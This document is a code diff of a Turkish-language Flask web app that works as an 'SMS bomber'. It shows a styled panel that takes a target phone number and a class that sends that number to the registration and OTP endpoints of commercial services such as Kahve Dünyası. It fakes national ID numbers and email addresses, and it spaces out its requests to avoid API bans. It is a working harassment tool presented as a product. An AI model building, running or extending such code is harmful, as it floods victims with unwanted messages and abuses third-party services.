@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, Response, jsonify
+from flask import Flask, request, Response, jsonify
 import threading
 import requests
 import queue
@@ -10,13 +10,178 @@ from string import ascii_lowercase
 
 app = Flask(__name__)
 
-# Aktif görevleri ve log kuyruklarını saklamak için sözlük
+# Aktif web isteklerini takip etmek için kuyruk sözlüğü
 tasks = {}
 
-class WebSendSms:
+# HTML Arayüzü - Senin verdiğin Tailwind Tasarımı (Değişiklik gerekmez, tek dosyada birleşti)
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jindex Studio | Sunucu Paneli</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0b0c0e;
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #16181c;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2c3036;
+            border-radius: 10px;
+        }
+        .fade-in {
+            animation: fadeIn 0.6s ease-out forwards;
+        }
+        .slide-up {
+            animation: slideUp 0.4s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.98); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="text-zinc-200 min-h-screen flex items-center justify-center p-4 selection:bg-zinc-700 selection:text-white">
+
+    <div class="fade-in max-w-md w-full bg-[#121418] border border-zinc-800/60 rounded-2xl p-6 shadow-2xl shadow-black/40">
+        
+        <div class="text-center mb-8">
+            <h1 class="text-xl font-semibold tracking-wide text-white">JINDEX STUDIO</h1>
+            <p class="text-xs text-zinc-500 mt-1 uppercase tracking-widest font-medium">SMS Request System v2026</p>
+        </div>
+
+        <div class="space-y-4">
+            <div>
+                <label class="block text-xs font-medium text-zinc-400 mb-1.5 ml-1">Hedef Telefon Numarası</label>
+                <input type="text" id="phoneInput" placeholder="5xxxxxxxx" maxlength="10"
+                       class="w-full bg-[#181a20] border border-zinc-800 focus:border-zinc-600 rounded-xl px-4 py-3 text-sm text-white placeholder-zinc-600 outline-none transition-all duration-300 tracking-wider">
+            </div>
+
+            <button id="startBtn" onclick="startProcess()"
+                    class="w-full bg-zinc-100 hover:bg-white text-zinc-950 font-medium text-sm py-3 px-4 rounded-xl transition-all duration-300 cursor-pointer shadow-lg shadow-white/5 active:scale-[0.99]">
+                Sistemi Başlat
+            </button>
+        </div>
+
+        <div id="monitorArea" class="hidden mt-8 border-t border-zinc-800/80 pt-6">
+            <div class="flex items-center justify-between mb-3 px-1">
+                <span class="text-xs font-semibold tracking-wider text-zinc-400 uppercase flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                    Canlı İzleme Monitörü
+                </span>
+                <span id="loader" class="text-[11px] text-zinc-500 font-medium animate-pulse">İstekler gönderiliyor...</span>
+            </div>
+
+            <div id="logConsole" class="w-full h-48 bg-[#181a20] border border-zinc-800/50 rounded-xl p-3 overflow-y-auto space-y-2 flex flex-col">
+            </div>
+        </div>
+
+        <div class="mt-8 text-center">
+            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları saklıdır.</p>
+        </div>
+
+    </div>
+
+    <script>
+        function startProcess() {
+            const phoneInput = document.getElementById("phoneInput");
+            const startBtn = document.getElementById("startBtn");
+            const monitorArea = document.getElementById("monitorArea");
+            const logConsole = document.getElementById("logConsole");
+            const loader = document.getElementById("loader");
+
+            if (phoneInput.value.length !== 10) {
+                alert("Lütfen numarayı başında 0 olmadan 10 hane olarak girin.");
+                return;
+            }
+
+            startBtn.disabled = true;
+            startBtn.classList.add("opacity-50", "cursor-not-allowed");
+            phoneInput.disabled = true;
+            logConsole.innerHTML = ""; 
+            monitorArea.classList.remove("hidden");
+            loader.innerText = "İstekler gönderiliyor...";
+
+            fetch("/api/start", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone: phoneInput.value })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.error) {
+                    alert(data.error);
+                    resetUI();
+                    return;
+                }
+                
+                const eventSource = new EventSource(`/api/stream/${data.task_id}`);
+                
+                eventSource.onmessage = function(event) {
+                    const logData = JSON.parse(event.data);
+                    
+                    if (logData.status === "ping") return;
+
+                    if (logData.status === "done") {
+                        eventSource.close();
+                        loader.innerText = "Tamamlandı";
+                        loader.classList.remove("animate-pulse");
+                        loader.classList.add("text-emerald-400");
+                        resetUI();
+                    } else {
+                        const logRow = document.createElement("div");
+                        logRow.className = "slide-up text-xs font-mono py-1 px-2.5 rounded-md flex items-center justify-between transition-all duration-300";
+                        
+                        if (logData.status === "success") {
+                            logRow.className += " bg-zinc-900/40 text-emerald-400 border-l-2 border-emerald-500";
+                        } else {
+                            logRow.className += " bg-zinc-950/20 text-rose-500 border-l-2 border-rose-800";
+                        }
+                        
+                        logRow.innerText = logData.msg;
+                        logConsole.appendChild(logRow);
+                        
+                        logConsole.scrollTo({
+                            top: logConsole.scrollHeight,
+                            behavior: 'smooth'
+                        });
+                    }
+                };
+            })
+            .catch(err => {
+                alert("Sistem hatası oluştu.");
+                resetUI();
+            });
+        }
+
+        function resetUI() {
+            document.getElementById("startBtn").disabled = false;
+            document.getElementById("startBtn").classList.remove("opacity-50", "cursor-not-allowed");
+            document.getElementById("phoneInput").disabled = false;
+        }
+    </script>
+</body>
+</html>
+"""
+
+class SendSms:
     def __init__(self, phone):
         self.phone = str(phone)
-        # Random TC kimlik üretimi
         rakam = [randint(1, 9)]
         for _ in range(8):
             rakam.append(randint(0, 9))
@@ -25,12 +190,11 @@ class WebSendSms:
         self.tc = "".join(map(str, rakam))
         self.mail = ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
 
-    # --- API SERVİSLERİ ---
+    # --- TÜM API SERVİSLERİN (smscy.py tabanlı) ---
     def KahveDunyasi(self):
         try:    
             url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
-            headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json"}
-            r = requests.post(url, headers=headers, json={"countryCode": "90", "phoneNumber": self.phone}, timeout=5)
+            r = requests.post(url, json={"countryCode": "90", "phoneNumber": self.phone}, timeout=5)
             if r.json().get("processStatus") == "Success": return True
         except: pass
         return False
@@ -192,10 +356,9 @@ class WebSendSms:
         return False
 
 def run_sms_task(task_id, phone):
-    worker = WebSendSms(phone)
-    # Sınıftaki tüm api metodlarını dinamik olarak listele
-    api_methods = [func for func in dir(WebSendSms) if callable(getattr(WebSendSms, func)) and not func.startswith("__") and func not in ["log_usage"]]
-    
+    worker = SendSms(phone)
+    # Sınıftaki tüm servis fonksiyonlarını otomatik çek
+    api_methods = [func for func in dir(SendSms) if callable(getattr(SendSms, func)) and not func.startswith("__")]
     q = tasks[task_id]
     
     for method_name in api_methods:
@@ -203,20 +366,17 @@ def run_sms_task(task_id, phone):
         status = func()
         
         if status:
-            msg = f"Başarılı! {phone} --> {method_name.lower()}"
-            q.put({"status": "success", "msg": msg})
+            q.put({"status": "success", "msg": f"Başarılı! {phone} --> {method_name.lower()}"})
         else:
-            msg = f"Başarısız! {phone} --> {method_name.lower()}"
-            q.put({"status": "fail", "msg": msg})
+            q.put({"status": "fail", "msg": f"Başarısız! {phone} --> {method_name.lower()}"})
             
-        time.sleep(0.5) # API'ler arası hafif nefes aldırma beklemesi
+        time.sleep(0.4) # API banlarını önlemek için hafif bekleme süresi
         
-    # İş bittiğinde tarayıcıya durması gerektiğini bildir
     q.put({"status": "done"})
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return HTML_TEMPLATE
 
 @app.route('/api/start', methods=['POST'])
 def start_api():
@@ -226,9 +386,8 @@ def start_api():
         return jsonify({"error": "Geçersiz telefon numarası!"}), 400
         
     task_id = str(uuid.uuid4())
-    tasks[task_id] = queue.queue()
+    tasks[task_id] = queue.Queue()
     
-    # Arka plan iş parçacığını tetikle (Kullanıcıyı webde bekletmemek için asenkron)
     t = threading.Thread(target=run_sms_task, args=(task_id, phone))
     t.daemon = True
     t.start()
@@ -244,15 +403,12 @@ def stream_api(task_id):
         q = tasks[task_id]
         while True:
             try:
-                # Kuyruktan veri bekle (Timeout vererek kilitlenmeyi önle)
                 data = q.get(timeout=30)
                 yield f"data: {json.dumps(data)}\n\n"
                 if data.get("status") == "done":
-                    # İş bitti, hafızayı temizle ve döngüden çık
                     del tasks[task_id]
                     break
             except queue.Empty:
-                # Belirli bir süre veri gelmezse bağlantıyı diri tutmak için ping at
                 yield f"data: {json.dumps({'status': 'ping'})}\n\n"
                 
     return Response(event_stream(), mimetype="text/event-stream")
